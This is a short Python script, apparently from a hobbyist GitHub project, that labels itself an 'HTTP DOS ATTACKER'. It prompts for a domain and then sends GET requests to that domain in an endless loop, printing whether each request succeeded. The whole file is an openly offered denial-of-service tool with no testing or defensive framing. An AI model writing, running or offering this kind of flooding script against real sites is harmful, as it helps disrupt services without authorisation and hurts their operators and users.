import os
from time import sleep
import colorama
from colorama import Fore
from colorama import Back
import requests
os.system("cls")
print(Fore.WHITE + Back.BLUE + "HTTP DOS ATTACKER\nMade by github.com/ghalbeyou !\n")
sleep(5)
os.system("cls")
ip = input(">> DOMAIN: ")
url = "http://" + ip
os.system("cls")
while True:
    print(Fore.RED + Back.BLACK + "\n>> Sending a new connecting ...")
    r = requests.get(url)
    if r.status_code == 200:
        print(Fore.GREEN + "\n>> Request send!")
    else:
        print(Fore.RED + "Cannot send, gotting this status code: " + str(r.status_code))